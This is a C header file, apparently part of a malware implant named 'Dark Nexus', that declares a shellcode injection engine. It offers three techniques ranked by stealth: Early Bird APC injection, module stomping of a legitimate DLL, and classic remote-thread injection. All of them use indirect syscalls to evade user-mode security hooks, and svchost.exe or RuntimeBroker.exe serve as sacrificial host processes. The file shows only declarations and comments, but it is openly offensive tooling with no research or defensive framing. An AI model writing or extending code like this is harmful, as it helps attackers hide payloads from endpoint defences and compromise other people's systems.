#ifndef DN_INJECTION_H
#define DN_INJECTION_H

#include <windows.h>

/*
 * Dark Nexus - Shellcode Injection Engine
 *
 * Multiple injection techniques in order of stealth:
 *   1. Early Bird APC injection (pre-resume thread APC queue)
 *   2. Module stomping (overwrite legitimate DLL .text section)
 *   3. Classic remote thread injection (fallback)
 *
 * All techniques use the indirect syscall engine (syscalls.h)
 * to avoid user-mode hooks on the Nt* APIs.
 */

// Injection result
typedef struct {
    BOOL    success;
    DWORD   pid;            // target PID (0 = self-inject)
    DWORD   tid;            // thread ID that runs the payload
    PVOID   base_addr;      // where the payload landed
    DWORD   technique;      // which technique succeeded (1-3)
} DN_INJECT_RESULT;

// Technique IDs
#define DN_INJECT_EARLYBIRD     1
#define DN_INJECT_STOMP         2
#define DN_INJECT_REMOTE        3

// -------------------------------------------------------------------
// Primary API: inject shellcode into a sacrificial process
// Creates the process, injects, and returns result.
// target_exe: path to sacrificial binary (e.g., "svchost.exe")
// If target_exe is NULL, defaults to RuntimeBroker.exe
// -------------------------------------------------------------------
DN_INJECT_RESULT dn_inject(const BYTE* shellcode, DWORD sc_size, const char* target_exe);

// -------------------------------------------------------------------
// Individual techniques (called by dn_inject in priority order)
// -------------------------------------------------------------------

// Early Bird: create suspended process, queue APC before main thread runs
DN_INJECT_RESULT dn_inject_earlybird(
    const BYTE* shellcode, DWORD sc_size, const char* target_exe
);

// Module stomping: load a legitimate DLL, overwrite its .text with shellcode
DN_INJECT_RESULT dn_inject_stomp(
    const BYTE* shellcode, DWORD sc_size, const char* target_exe
);

// Classic remote thread: VirtualAllocEx + WriteProcessMemory + CreateRemoteThread
DN_INJECT_RESULT dn_inject_remote(
    const BYTE* shellcode, DWORD sc_size, const char* target_exe
);

#endif // DN_INJECTION_H
